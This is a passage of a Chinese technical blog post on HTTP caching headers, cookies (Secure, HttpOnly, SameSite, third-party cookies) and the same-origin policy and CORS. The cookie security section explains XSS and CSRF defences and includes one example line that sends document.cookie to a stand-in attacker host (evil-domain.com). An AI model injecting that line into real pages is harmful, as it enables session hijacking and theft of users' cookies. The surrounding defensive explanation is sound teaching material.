<tr>
<td>only-if-cached</td>
<td>仅请求</td>
<td>表明客户端只接受已经缓存的响应，并且不需要向服务端检查是否有更新的文件</td>
</tr>
</tbody></table>
<h3 id="Pragma-头部（deprecated，不推荐使用）"><a href="#Pragma-头部（deprecated，不推荐使用）" class="headerlink" title="Pragma 头部（deprecated，不推荐使用）"></a>Pragma 头部（deprecated，不推荐使用）</h3><p>Pragma 是 HTTP/1.0 标准中定义的一个 Header 属性，请求中包含 Pragma 头与请求中包含 Cache-Control: no-cache 效果相同，但是 HTTP 的响应头没有明确地定义这个属性，所以不能用来完全替代 Cache-Control 头。通常定义 Pragma 以向后兼容基于 HTTP/1.0 的客户端。</p>
<h3 id="Expires-头部（强缓存）"><a href="#Expires-头部（强缓存）" class="headerlink" title="Expires 头部（强缓存）"></a>Expires 头部（强缓存）</h3><p>Expires 响应头包含日期/时间（是一个绝对的日期时间），即在此日期/时间后，缓存过期。0 与过去的日期都是无效的，因为他们表示资源已经过期。</p>
<p>若在 Cache-Control 响应头设置了“max-age”或者“s-maxage”指令，Expires 头会被忽略。</p>
<h3 id="Etag-头部（协商缓存）"><a href="#Etag-头部（协商缓存）" class="headerlink" title="Etag 头部（协商缓存）"></a>Etag 头部（协商缓存）</h3><p>ETag 响应头是资源的特定版本标识符。这可以让缓存更高效，并节省带宽，因为如果内容没有改变，Web 服务器不需要发送完整的响应。而如果内容发生了变化，使用 ETag 有助于防止资源的同时更新相互覆盖（“空中碰撞”）。</p>
<p><code>ETag: [W/]&quot;&lt;etag_value&gt;&quot;</code></p>
<p><code>W/</code>（可选、大小写敏感）表示使用弱验证器。弱验证器易生成，但不利于比较。强验证器是理想选择，但难有效生成。相同资源的两个弱 Etag 值可能语义等同，但不是每个字节都相同。</p>
<p>“<etag_value>“唯一地表示所请求的资源。它们是位于双引号间的 ASCII 字符串。没有明确指定生成 ETag 值的方法。通常使用内容的散列值、最后修改时间的哈希值或简单地使用版本号。</p>
<h4 id="避免“空中碰撞”"><a href="#避免“空中碰撞”" class="headerlink" title="避免“空中碰撞”"></a>避免“空中碰撞”</h4><p>在 ETag 和 If-Match 头部的帮助下，可以检测到“空中碰撞”的编辑冲突。</p>
<p>例如当编辑 MDN 时，当前的 wiki 内容被散列，并在响应中放入 ETag，将更改保存到 wiki 页面时，POST 请求用包含有 ETag 值的 If-Match 头来检查是否为最新版本。若哈希值不匹配，则意味着文档已经被编辑，会抛出 412 前置条件失败错误。</p>
<h4 id="缓存未更改的资源"><a href="#缓存未更改的资源" class="headerlink" title="缓存未更改的资源"></a>缓存未更改的资源</h4><p>ETag 头的另一个典型用例是缓存未更改的资源。如果用户再次访问设有 ETag 的 URL，资源过期了且不可用，客户端就发送值为 ETag 的 If-None-Match 头。服务器将客户端的 ETag 与当前版本资源的 ETag 进行比较，如果两个值匹配（即资源未更改），服务器将返回不带 body 的 304 未修改状态，告诉客户端缓存仍可用。</p>
<h3 id="Last-Modified-头部（协商缓存）"><a href="#Last-Modified-头部（协商缓存）" class="headerlink" title="Last-Modified 头部（协商缓存）"></a>Last-Modified 头部（协商缓存）</h3><p>Last-Modified 是一个响应头部，其中包含服务端认定的资源做出修改的日期时间。它通常被用作验证器来判断资源是否一致。由于精度低于 ETag，所以是个备用机制。If-Modified-Since 与 If-Unmodified-Since 头部会使用这个字段。</p>
<h3 id="缓存控制"><a href="#缓存控制" class="headerlink" title="缓存控制"></a>缓存控制</h3><ol>
<li><p>请求一个资源时首先会检查强缓存 Cache-Control 的 max-age 或 s-maxage，若未过期则直接使用缓存响应请求，若过期则跳至 3 检查协商缓存，若无 max-age 或 s-maxage 值，则至 2 检查强缓存 Expires；</p>
</li>
<li><p>若检查 Expires 未过期则直接使用缓存响应请求，若过期或不存在 Expires 头则跳至 3 检查协商缓存；</p>
</li>
<li><p>若 ETag 存在，则将 ETag 值带入 If-None-Match 头中请求服务器判断资源是否更新，若未更新，返回不带 body 的 304 Not Modified 响应，直接使用缓存响应请求，若资源已更新，正常返回状态码为 200 的资源；若 ETag 不存在，跳至 4 检查协商缓存；</p>
</li>
<li><p>若 Last-Modified 存在，将 Last-Modified 值带入 If-Modified-Since 头中请求服务器判断资源是否更新，若未更新，返回不带 body 的 304 Not Modified 响应，直接使用缓存响应请求，若资源已更新，正常返回状态码为 200 的资源，若 Last-Modified 不存在，则当作没有缓存，直接正常请求资源</p>
</li>
</ol>
<p>对于含有特定头信息的请求，会去计算缓存寿命。比如 Cache-Control: max-age=N 或 s-maxage=N 的头，相应缓存的寿命就是 N。通常情况下，对于不含这个属性的请求则会去查看是否包含 Expires 属性，通过比较 Expires 的值和头里面 Date 属性值来判断缓存是否还有效，若 Date 属性不存在，则使用本地时间。如果 max-age、s-maxage 和 expires 属性都没有，就会找头部的 Last-Modified 信息。若有，缓存的寿命就等于头里面 Date 的值减去 Last-Modified 的值除以 10。</p>
<p>缓存失效时间计算公式：</p>
<blockquote>
<p>expirationTime = responseTime + freshnessLifetime - currentAge</p>
<p>responseTime 指浏览器接收到响应的那个时间点<br>freshnessLifetime 指缓存的寿命<br>currentAge 指当前时间点</p>
</blockquote>
<h4 id="max-age-与-s-maxage-优先级高于-Expires-原因"><a href="#max-age-与-s-maxage-优先级高于-Expires-原因" class="headerlink" title="max-age 与 s-maxage 优先级高于 Expires 原因"></a>max-age 与 s-maxage 优先级高于 Expires 原因</h4><p>由于 Expires 是同 Date 或本地时间做比较，当 Date 不存在使用本地时间时，世界各地由于时差问题，会导致 Expires 判断出错。故 max-age 与 s-maxage 优先级更高。</p>
<h4 id="Etag-优先级高于-Last-Modified-原因"><a href="#Etag-优先级高于-Last-Modified-原因" class="headerlink" title="Etag 优先级高于 Last-Modified 原因"></a>Etag 优先级高于 Last-Modified 原因</h4><p>Last-Modified 只精确到秒，一秒内的更新缓存就会检查不到，另外若是资源代码本身没改，但 Last-Modified 被更改，就会导致缓存不必要地更新。而 ETag 则是根据资源内容生成的 hash 值判断，比 Last-Modified 更精确，故优先级更高。</p>
<h4 id="加速资源"><a href="#加速资源" class="headerlink" title="加速资源"></a>加速资源</h4><p>更多地利用缓存资源，可以提高网站的性能和响应速度。为了优化缓存，过期时间设置得尽量长是一种很好的策略。对于定期或者频繁更新的资源，这么做是比较稳妥的，但是对于那些长期不更新的资源会有点问题。这些固定的资源在一定时间内受益于这种长期保持的缓存策略，但一旦要更新就会很困难。特指网页上引入的一些 js/css 文件，当它们变动时需要尽快更新线上资源。</p>
<p>web 开发者发明了一种被 Steve Sounders 称之为<code>revving</code>的技术。不频繁更新的文件会使用特定的命名方式：在 URL 后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web 开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。</p>
<p>这种方法还有一个好处：同时更新两个缓存资源不会造成部分缓存先更新而引起新旧文件内容不一致。对于互相有依赖关系的 css 和 js 文件，避免这种不一致性是非常重要的。</p>
<p>加在加速文件后面的版本号不一定是一个正式的版本号字符串，如 1.1.3 这样或者其他固定自增的版本数。它可以是任何防止缓存碰撞的标记例如 hash 或者时间戳。</p>
<h3 id="带-Vary-头的响应"><a href="#带-Vary-头的响应" class="headerlink" title="带 Vary 头的响应"></a>带 Vary 头的响应</h3><p><code>Vary</code> HTTP 响应头决定了对于后续的请求头，如何判断是请求一个新的资源还是使用缓存的文件。</p>
<p>当缓存服务器收到一个请求，只有当前的请求和原始（缓存）的请求头跟缓存的响应头里的 Vary 都匹配，才能使用缓存的响应。</p>
<p>使用 Vary 头有利于内容服务的动态多样性。例如，使用 Vary：User-Agent 头，缓存服务器需要通过 UA 判断是否使用缓存的页面。如果需要区分移动端和桌面端的展示内容，利用这种方式就能避免在不同的终端展示错误的布局。另外，它可以帮助 Google 或者其他搜索引擎更好地发现页面的移动版本，并且告诉搜索引擎没有引入伪装（Cloaking）。</p>
<p><code>Vary: User-Agent</code></p>
<p>因为移动版和桌面客户端的请求头中的 User-Agent 不同，缓存服务器不会错误地把移动端的内容输出到桌面端用户。</p>
<h2 id="HTTP-Cookie"><a href="#HTTP-Cookie" class="headerlink" title="HTTP Cookie"></a>HTTP Cookie</h2><p>Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登陆状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。</p>
<p>Cookie 主要用于以下三个方面：</p>
<ul>
<li><p>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</p>
</li>
<li><p>个性化设置（如用户自定义设置、主题等）</p>
</li>
<li><p>浏览器行为跟踪（如跟踪分析用户行为等）</p>
</li>
</ul>
<p>Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但随着现代浏览器开始支持各种各样的存储方式，Cookie 作为存储的功能渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储在本地，如使用 Web Storage API（本地存储和会话存储）或 IndexedDB。</p>
<h3 id="创建-Cookie"><a href="#创建-Cookie" class="headerlink" title="创建 Cookie"></a>创建 Cookie</h3><p>当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 Set-Cookie 属性。浏览器收到响应后会将 Set-Cookie 属性中的值保存在浏览器 Cookie 中，之后对该服务器每一次请求中都通过 Cookie 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>
<h4 id="Set-Cookie-响应头部和-Cookie-请求头部"><a href="#Set-Cookie-响应头部和-Cookie-请求头部" class="headerlink" title="Set-Cookie 响应头部和 Cookie 请求头部"></a>Set-Cookie 响应头部和 Cookie 请求头部</h4><p>服务器使用 Set-Cookie 响应头部向用户代理（一般是浏览器）发送 Cookie 信息。</p>
<p><code>Set-Cookie: cookie名=cookie值</code></p>
<p>服务器通过该头部告知客户端保存 Cookie 信息</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">HTTP/1.0 200 OK
Content-Type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的 Cookie 信息通过 Cookie 请求头部再发送给服务器。</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="会话期-Cookie"><a href="#会话期-Cookie" class="headerlink" title="会话期 Cookie"></a>会话期 Cookie</h4><p>会话期 Cookie 是最简单的 Cookie：浏览器关闭后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（Expires）或有效期（Max-Age）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期 Cookie 也会被保留下来，就好像浏览器从来没有关闭一样。</p>
<h4 id="持久性-Cookie"><a href="#持久性-Cookie" class="headerlink" title="持久性 Cookie"></a>持久性 Cookie</h4><p>与会话期 Cookie 不同，持久性 Cookie 可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。</p>
<p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</code></p>
<blockquote>
<p>提示：当 Cookie 的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。</p>
</blockquote>
<h4 id="Cookie-的-Secure-和-HttpOnly-标记"><a href="#Cookie-的-Secure-和-HttpOnly-标记" class="headerlink" title="Cookie 的 Secure 和 HttpOnly 标记"></a>Cookie 的 Secure 和 HttpOnly 标记</h4><p>标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http）无法使用 Cookie 的 Secure 标记。</p>
<p>为避免跨域脚本（XSS）攻击，通过 JavaScript 的 document.cookie API 无法访问带有 HttpOnly 标记的 Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记。</p>
<p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</code></p>
<h4 id="Cookie-的作用域"><a href="#Cookie-的作用域" class="headerlink" title="Cookie 的作用域"></a>Cookie 的作用域</h4><p>Domain 和 Path 标识定义了 Cookie 的作用域：即 Cookie 应该发送给哪些 URL。</p>
<p>Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。</p>
<p>例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。</p>
<p>Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符<code>%x2f</code>（“/”）作为路径分隔符，子路径也会被匹配。</p>
<p>例如，设置 Path=/docs，则以下地址都会匹配</p>
<ul>
<li><p>/docs</p>
</li>
<li><p>/docs/Web/</p>
</li>
<li><p>/docs/Web/HTTP</p>
</li>
</ul>
<h4 id="SameSite-Cookie"><a href="#SameSite-Cookie" class="headerlink" title="SameSite Cookie"></a>SameSite Cookie</h4><p>SameSite Cookie 允许服务器要求某个 Cookie 在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。</p>
<p>SameSite 是 Cookie 相对较新的一个字段，所有主流浏览器都已经得到支持。</p>
<p><code>Set-Cookie: key=value; SameSite=Strict</code></p>
<p>SameSite 可以取下面三种值：</p>
<ol>
<li><p>None: 浏览器会在同站请求、跨站请求下继续发送 Cookie，不区分大小写</p>
</li>
<li><p>Strict：浏览器将只发送相同站点请求的 cookie（即当前网页 URL 与请求目标 URL 完全一致）。如果请求来自与当前 URL 不同的 URL，则不发送标记为 Strict 属性的 Cookie</p>
</li>
<li><p>Lax：在新版本浏览器中为默认值，比 Strict 稍宽松些，只有当用户从外部站点以 GET 请求方式导航到 URL 时才会发送 Cookie，其中仅包括：a 链接、link 标签预加载资源、GET 表单，而 POST 表单、iframe、AJAX、img 则不会发送 Cookie。</p>
</li>
</ol>
<blockquote>
<p>以前，如果 SameSite 属性没有设置，或者没有得到运行浏览器的支持，那么它的行为等同于 None，Cookie 会被包含在任何请求中——包括跨站请求。</p>
<p>但是，在新版本的浏览器中，SameSite 的默认属性是 SameSite=Lax。即当 Cookie 没有设置 SameSite 属性时，将会视为 SameSite 属性被设置为 Lax。</p>
</blockquote>
<h4 id="JavaScript-通过-Document-cookie-访问-Cookie"><a href="#JavaScript-通过-Document-cookie-访问-Cookie" class="headerlink" title="JavaScript 通过 Document.cookie 访问 Cookie"></a>JavaScript 通过 Document.cookie 访问 Cookie</h4><p>通过 Document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">'yummy_cookie=choco'</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">'tasty_cookie=strawberry'</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// "yummy_cookie=choco; tasty_cookie=strawberry"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><p><strong>当处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息。</strong></p>
<h4 id="会话劫持与跨站脚本攻击-XSS（cross-site-script）"><a href="#会话劫持与跨站脚本攻击-XSS（cross-site-script）" class="headerlink" title="会话劫持与跨站脚本攻击 XSS（cross site script）"></a>会话劫持与跨站脚本攻击 XSS（cross site script）</h4><p>在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法就是利用应用程序漏洞进行 XSS 攻击。</p>
<p>xss（由于 cross 有十字架的意思故常用 x 形象地代替 cross 缩写）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户使用被注入的网页后，用户信息等被注入的代码获取，并发送给第三方。这类攻击通常包含了 HTML 以及用户端脚本语言。</p>
<p>xss 的防范</p>
<ol>
<li><p>服务端 set-cookie 响应头使用 HttpOnly，防止被 js 获取</p>
</li>
<li><p>对用户的任何输入都进行检查与转义</p>
</li>
<li><p>服务端输出的模板也应用编码与转义防御 xss 攻击</p>
</li>
</ol>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span>
  <span class="token string">'http://www.evil-domain.com/steal-cookie.php?cookie='</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>HttpOnly 类型的 Cookie 由于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。</p>
<h4 id="跨站请求伪造-CSRF-（cross-site-request-forgery）"><a href="#跨站请求伪造-CSRF-（cross-site-request-forgery）" class="headerlink" title="跨站请求伪造 CSRF （cross site request forgery）"></a>跨站请求伪造 CSRF （cross site request forgery）</h4><p>也常被称为 XSRF，是一种冒充用户发起请求，执行非用户本意操作的攻击方法。</p>
<p>攻击者借用户的 Cookie 骗取服务器信任，在用户不知情的情况下，以用户身份伪造请求发送给服务器，执行需要权限的操作。</p>
<p>CSRF 的防范：</p>
<ol>
<li><p>使用验证码，验证码保证了请求是在用户交互的情况下完成的请求。</p>
</li>
<li><p>Referer Check，HTTP 头中有一个属性是 Referer，它记录了 HTTP 请求的来源地址，服务端通过 Referer Check，可以检查请求是否来自合法的“源”。Referer Check 还可以用来做图片防盗链。</p>
</li>
<li><p>添加 token 验证。在请求中加入一个攻击者无法伪造且不存在于 Cookie 的 token，在服务端建立一个拦截器来验证 token，只有 token 正确才被认为是真实的请求。</p>
</li>
</ol>
<h3 id="追踪和隐私"><a href="#追踪和隐私" class="headerlink" title="追踪和隐私"></a>追踪和隐私</h3><h4 id="第三方-Cookie"><a href="#第三方-Cookie" class="headerlink" title="第三方 Cookie"></a>第三方 Cookie</h4><p>每个 Cookie 都会有与之关联的域（Domain），如果 Cookie 的域和页面的域相同，那么我们称这个 Cookie 为第一方 Cookie（first-party cookie），如果 Cookie 的域和页面的域不同，则称之为第三方 Cookie（third-party cookie）。一个页面包含图片或存放在其他域上的资源（如图片广告）时，第一方的 Cookie 也只会发送给设置它们的服务器。通过第三方组件发送的第三方 Cookie 主要用于广告和网络追踪。大多数浏览器默认都允许第三方 Cookie，但可以通过设置来阻止第三方 Cookie。</p>
<p>如果你没有公开你网站上第三方 Cookie 的使用情况，当被用户发觉时，你网站的受信任程度可能会受到影响。一个清晰的声明（如在隐私策略里提及）能够减少或消除这些负面影响。在一些国家已经开始对 Cookie 制订相应的法规。</p>
<h4 id="禁止追踪-Do-Not-Track"><a href="#禁止追踪-Do-Not-Track" class="headerlink" title="禁止追踪 Do-Not-Track"></a>禁止追踪 Do-Not-Track</h4><p>虽然没有法律或技术手段强制要求使用 DNT，但是通过 DNT 请求头可以告诉 Web 程序不要对用户行为进行追踪或者跨站追踪。</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">DNT: 0 //表示用户愿意目标站点追踪用户个人信息
DNT: 1 //表示用户不愿意目标站点追踪用户个人信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>使用 JavaScript 读取 DNT 状态</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">navigator<span class="token punctuation">.</span>doNotTrack<span class="token punctuation">;</span> <span class="token comment">// "0" or "1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="欧盟-Cookie-指令"><a href="#欧盟-Cookie-指令" class="headerlink" title="欧盟 Cookie 指令"></a>欧盟 Cookie 指令</h4><p>要求欧盟各成员国通过制定相关法律来满足指令要求，已于 2011 年 5 月 25 日生效。指令内容大致为：在征得用户同意前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。自此，很多网站都在声明中添加了相关说明，告知用户他们的 Cookie 将用于何处。</p>
<h4 id="僵尸-Cookie"><a href="#僵尸-Cookie" class="headerlink" title="僵尸 Cookie"></a>僵尸 Cookie</h4><p>Cookie 的一个极端用例是僵尸 Cookie（或称删不掉的 Cookie），这类 Cookie 难以删除，因为删除后会自动重建。它们一般使用 Web Storage API、Flash 本地共享对象或者其他技术手段实现。</p>
<h3 id="Cookie-与-Web-Storage-API-对比"><a href="#Cookie-与-Web-Storage-API-对比" class="headerlink" title="Cookie 与 Web Storage API 对比"></a>Cookie 与 Web Storage API 对比</h3><table>
<thead>
<tr>
<th></th>
<th>Cookie</th>
<th>LocalStorage</th>
<th>SessionStorage</th>
</tr>
</thead>
<tbody><tr>
<td>大小</td>
<td>4K</td>
<td>5M</td>
<td>5M</td>
</tr>
<tr>
<td>生命周期</td>
<td>可设置过期时间，不设置则关闭浏览器后过期</td>
<td>永久保存，直至清除</td>
<td>关闭页面或浏览器后清除</td>
</tr>
<tr>
<td>作用域</td>
<td>宽松同源策略，协议与端口可以不同，且 Cookie 可以被给定域及其子域访问到</td>
<td>同源策略，协议、主机、端口一致的页面可共享 LocalStorage</td>
<td>同源策略+浏览器标签页隔离，同一 Tab 标签页下同源网站才可共享 SessionStorage，即在两个标签页中打开同一个网站，也是各自维护各自的 SessionStorage，不可共享</td>
</tr>
<tr>
<td>传输</td>
<td>加了 with-credential 请求头后，每次请求都会携带 Cookie</td>
<td>不会携带在请求中</td>
<td>不会携带在请求中</td>
</tr>
<tr>
<td>易用性</td>
<td>无 get 与 set 接口，使用麻烦</td>
<td>原生 API，使用方便</td>
<td>原生 API，使用方便</td>
</tr>
</tbody></table>
<h2 id="HTTP-跨域资源共享-CORS（Cross-Origin-Resource-Sharing）"><a href="#HTTP-跨域资源共享-CORS（Cross-Origin-Resource-Sharing）" class="headerlink" title="HTTP 跨域资源共享 CORS（Cross-Origin Resource Sharing）"></a>HTTP 跨域资源共享 CORS（Cross-Origin Resource Sharing）</h2><p>跨域资源共享（CORS）是一种机制，它使用额外的 HTTP 头来告诉浏览器让运行在一个 origin（domain）上的 Web 应用被准许访问来自不同源服务器上的指定资源。当一个资源从与该资源本身所在的服务器不同的域、协议或端口请求一个资源时，资源会发起一个跨域 HTTP 请求。比如，站点 <code>http://domain-a.com</code> 的某 HTML 页面通过 img 标签的 src 请求<code>http://domain-b.com/image.jpg</code>。网络上的许多页面都会加载来自不同域的 CSS 样式表，图像和脚本资源。</p>
<p>出于安全原因，浏览器限制<strong>从脚本内</strong>发起的跨域 HTTP 请求。例如，XMLHttpRequest 和 Fetch API 遵循同源策略。这意味着使用这些 API 和 Web 应用程序只能从加载应用程序的同一个域请求 HTTP 资源，除非响应报文包含了正确 CORS 响应头。</p>
<h3 id="浏览器同源策略"><a href="#浏览器同源策略" class="headerlink" title="浏览器同源策略"></a>浏览器同源策略</h3><p>同源策略是一个重要的安全策略，它用于限制一个源的文档或者它加载的脚本与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。</p>
<h4 id="同源的定义"><a href="#同源的定义" class="headerlink" title="同源的定义"></a>同源的定义</h4><p>如果两个 URL 的协议（protocal）、主机（host）、端口（port）都相同，则这两个 URL 同源。</p>
<h4 id="源的继承"><a href="#源的继承" class="headerlink" title="源的继承"></a>源的继承</h4><p>在页面中通过<code>about:blank</code>或<code>javascript:URL</code>执行的脚本会继承打开该 URL 的文档的源，因为这些类型的 URLs 没有包含源服务器的相关信息。</p>
<p>例如，<code>about:blank</code>通常作为父脚本弹出的空白窗口的 URL（window.open()）。若此弹出窗口也包含 JavaScript，则该脚本将从创建它的脚本那里继承对应的源。值得注意的是 data:URLs 获得的是一个新的、空的安全上下文。</p>
<h4 id="源的更改"><a href="#源的更改" class="headerlink" title="源的更改"></a>源的更改</h4><p>满足某些限制条件的情况下，页面可以修改它的源。脚本可以将 document.domain 的值设置为当前域或当前域的父域。如果将其设置为当前域的父域，则这个较短的父域将会用于页面后续的源检查。</p>
<p>例如：在<code>http://store.company.com/dir/other.html</code>文档中的一个脚本执行了更改源的语句<code>document.domain = &quot;company.com&quot;;</code>，语句执行后，页面将会成功地通过与<code>http://company.com/dir/page.html</code>的同源检测（这里假定<code>http://company.com/dir/page.html</code>已经将<code>document.domain</code>设置为<code>company.com</code>，后面会讲原因）。非常重要的是，源的修改只能向自己的父域修改，不可以修改至其他源（如本例中不能修改为<code>othercompany.com</code>），当然如果当前域已经是一级域（如<code>company.com</code>），则无法修改为父域（<code>com</code>），因为父域已经是顶域了，如果可以修改为顶域，就会导致所有 com 顶域都同源的情况。</p>
<p>端口号是由浏览器另行检查的。任何对 document.domain 的赋值操作，包括<code>document.domain = document.domain</code> 都会导致端口号被重写为 null。因此<code>http://company.com:8080</code>单方面设置<code>document.domain = &quot;company.com&quot;</code>还不够，还必需在<code>http://company.com</code>（默认端口是 80）中也进行赋值操作<code>document.domain = &quot;company.com&quot;</code>，以确保端口号都为 null。前面设置子域的 document.domain 来访问父域时，我们假定父域已修改也是出于这个原因，即使看起来父域的设置多此一举，但隐含的端口号其实不一致（一个为 null，一个为 80），同时设置避免了端口号不同造成的同源判定失败。</p>
<h4 id="跨域网络访问"><a href="#跨域网络访问" class="headerlink" title="跨域网络访问"></a>跨域网络访问</h4><p>同源策略控制不同源之间的交互，这些交互通常分为三类：</p>
<ul>
<li><p>跨域写操作（Cross-Origin Writes）一般是被允许的。例如链接（links），重定向以及表单提交。特定少数 HTTP 请求需要添加 preflight。</p>
</li>
<li><p>跨域资源嵌入（Cross-Origin Embedding）一般是被允许的。</p>
<ul>
<li><p>script 标签嵌入跨域脚本。语法错误信息只能被同源脚本捕获。</p>
</li>
<li><p>link 标签嵌入 CSS。由于 CSS 松散的语法规则，CSS 跨域需要设置正确的 HTTP 头部 Content-Type，这在不同的浏览器中有不同的限制。</p>
</li>
<li><p>通过 img 标签展示的图片。支持的格式包括 PNG、JPEG、GIF、BMP、SVG 等。</p>
</li>
<li><p>通过 video 标签与 audio 标签播放的多媒体资源。</p>
</li>
<li><p>通过 object、embed、applet 三种标签嵌入的插件。</p>
</li>
<li><p>通过@font-face 引入的字体。一些浏览器支持跨域字体，一些需要使用同源字体。</p>
</li>
<li><p>通过 iframe 标签载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。</p>
</li>
</ul>
</li>
<li><p>跨域读操作（Cross-Origin Reads）一般是不被允许的，但可以通过内嵌资源来巧妙进行读取访问。</p>
</li>
</ul>
<p>允许跨域访问：</p>
<ul>
<li>我们使用跨域资源共享（CORS）来允许跨域访问。CORS 是 HTTP 的一部分，允许服务端来指定哪些主机可以从这个服务端加载资源。</li>
</ul>
<p>阻止跨域访问：</p>
<ul>
<li><p>阻止跨域写操作，只要检测请求中的一个不可被推测标记（CSRF token）即可，这个标记被称为跨站请求伪造标记。若请求中没有这个标记，则将请求当作伪造请求，阻止访问。</p>
</li>
<li><p>阻止资源的跨域读取，最重要的是保证该资源是不可嵌入的，因为嵌入资源通常不被限制。</p>
</li>
<li><p>阻止跨站嵌入，首先需要确保资源是不能转译后通过嵌入资源格式使用的。其次就是设置 CSRF 标记来防止嵌入。</p>
</li>
</ul>
<h4 id="跨域脚本-API-访问"><a href="#跨域脚本-API-访问" class="headerlink" title="跨域脚本 API 访问"></a>跨域脚本 API 访问</h4><p>JavaScript 的 API 中，如 iframe.contentWindow、window.parent、window.open、window.opener 允许文档间直接相互引用。当两个文档不同源时，这些引用方式将对 Window 和 Location 对象的访问添加限制，为了能让不同源的文档进行交互，可以使用 window.postMessage。</p>
<p>Window</p>
<p>允许以下对 Window 方法与属性的跨域访问：</p>
<table>
<thead>
<tr>
<th>方法</th>
</tr>
</thead>
<tbody><tr>
<td>window.blur</td>
</tr>
<tr>
<td>window.close</td>
</tr>
<tr>
<td>window.focus</td>
</tr>
<tr>
<td>window.postMessage</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>属性</th>
<th>是否可读写</th>
</tr>
</thead>
<tbody><tr>
<td>window.closed</td>
<td>只读</td>
</tr>
<tr>
<td>window.frames</td>
<td>只读</td>
</tr>
<tr>
<td>window.length</td>
<td>只读</td>
</tr>
<tr>
<td>window.location</td>
<td>读写</td>
</tr>
<tr>
<td>window.opener</td>
<td>只读</td>
</tr>
<tr>
<td>window.parent</td>
<td>只读</td>
</tr>
<tr>
<td>window.self</td>
<td>只读</td>
</tr>
<tr>
<td>window.top</td>
<td>只读</td>
</tr>
<tr>
<td>window.window</td>
<td>只读</td>
</tr>
</tbody></table>
<p>某些浏览器允许访问除上述外更多的属性。</p>
<p>Location</p>
